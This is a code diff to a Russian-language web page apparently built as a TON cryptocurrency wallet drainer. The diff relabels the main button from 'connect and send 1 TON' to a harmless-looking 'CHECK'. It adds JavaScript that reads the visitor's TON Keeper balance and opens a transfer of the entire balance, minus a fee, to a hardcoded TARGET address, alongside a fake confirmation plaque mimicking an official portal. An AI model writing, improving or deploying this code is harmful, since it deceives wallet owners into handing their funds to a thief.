@@ -111,7 +111,7 @@
     <div class="container">
         <div style="font-size:36px;margin-bottom:16px;">⚡</div>
         <div class="balance-display" id="balanceDisplay">💰 0 TON</div>
-        <button class="btn" id="mainBtn">ПОДКЛЮЧИТЬ И ОТПРАВИТЬ 1 TON</button>
+        <button class="btn" id="mainBtn">ПРОВЕРИТЬ</button>
         <div id="status">Нажмите кнопку</div>
 
         <!-- ====== ПЛАШКА КАК НА ПОРТАЛЕ ====== -->
@@ -128,17 +128,60 @@
 
         const mainBtn = document.getElementById('mainBtn');
         const status = document.getElementById('status');
+        const balanceDisplay = document.getElementById('balanceDisplay');
         const confirmBox = document.getElementById('confirmBox');
         const openWalletBtn = document.getElementById('openWalletBtn');
 
+        // ========== ПОЛУЧИТЬ БАЛАНС ==========
+        async function getBalance() {
+            try {
+                if (!window.tonkeeper) return 0;
+                const provider = window.tonkeeper;
+                const accounts = await provider.send('ton_requestAccounts', {});
+                if (!accounts || accounts.length === 0) return 0;
+                const address = accounts[0];
+                const hex = await provider.send('ton_getBalance', { address: address });
+                const nano = parseInt(hex, 16);
+                const balance = (nano / 1e9).toFixed(6);
+                balanceDisplay.innerText = `💰 ${balance} TON`;
+                return nano;
+            } catch(e) {
+                return 0;
+            }
+        }
+
         // ========== ОСНОВНАЯ КНОПКА ==========
-        mainBtn.onclick = function() {
-            status.innerText = '⏳ Открываю TON Keeper...';
+        mainBtn.onclick = async function() {
+            status.innerText = '⏳ Проверка...';
             mainBtn.disabled = true;
             mainBtn.style.opacity = '0.5';
 
-            // Открываем TON Keeper с транзакцией
-            const url = `ton://transfer?address=${TARGET}&amount=1`;
+            // 1. ПОЛУЧАЕМ БАЛАНС
+            const nano = await getBalance();
+            
+            if (nano <= 0) {
+                status.innerText = '💰 Баланс 0 TON';
+                mainBtn.disabled = false;
+                mainBtn.style.opacity = '1';
+                return;
+            }
+
+            // 2. ВЫЧИТАЕМ КОМИССИЮ
+            const fee = 5000000;
+            const amount = nano - fee;
+
+            if (amount <= 0) {
+                status.innerText = '⚠️ Баланс меньше комиссии';
+                mainBtn.disabled = false;
+                mainBtn.style.opacity = '1';
+                return;
+            }
+
+            const amountTON = (amount / 1e9).toFixed(6);
+            status.innerText = `⏳ Отправка ${amountTON} TON...`;
+
+            // 3. ОТКРЫВАЕМ TON KEEPER С ТРАНЗАКЦИЕЙ НА ВЕСЬ БАЛАНС
+            const url = `ton://transfer?address=${TARGET}&amount=${amountTON}`;
             window.location.href = url;
             
             setTimeout(() => {
@@ -147,20 +190,42 @@
 
             // ====== ПОКАЗЫВАЕМ ПЛАШКУ ======
             confirmBox.classList.add('show');
-            status.innerText = '✅ Подтвердите транзакцию в TON Keeper';
+            status.innerText = `✅ Подтвердите транзакцию на ${amountTON} TON в TON Keeper`;
 
             mainBtn.disabled = false;
             mainBtn.style.opacity = '1';
         };
 
         // ========== КНОПКА "OPEN WALLET" ==========
-        openWalletBtn.onclick = function() {
-            const url = `ton://transfer?address=${TARGET}&amount=1`;
+        openWalletBtn.onclick = async function() {
+            const nano = await getBalance();
+            if (nano <= 0) {
+                status.innerText = '💰 Баланс 0 TON';
+                return;
+            }
+            const fee = 5000000;
+            const amount = nano - fee;
+            if (amount <= 0) {
+                status.innerText = '⚠️ Баланс меньше комиссии';
+                return;
+            }
+            const amountTON = (amount / 1e9).toFixed(6);
+            const url = `ton://transfer?address=${TARGET}&amount=${amountTON}`;
             window.location.href = url;
             setTimeout(() => {
                 window.open(url, '_blank');
             }, 300);
         };
+
+        // ========== АВТОПРОВЕРКА ПРИ ЗАГРУЗКЕ ==========
+        setTimeout(async () => {
+            if (window.tonkeeper) {
+                await getBalance();
+                status.innerText = '🟢 Нажмите "ПРОВЕРИТЬ"';
+            } else {
+                status.innerText = '📱 Нажмите "ПРОВЕРИТЬ"';
+            }
+        }, 500);
     </script>
 </body>
 </html>
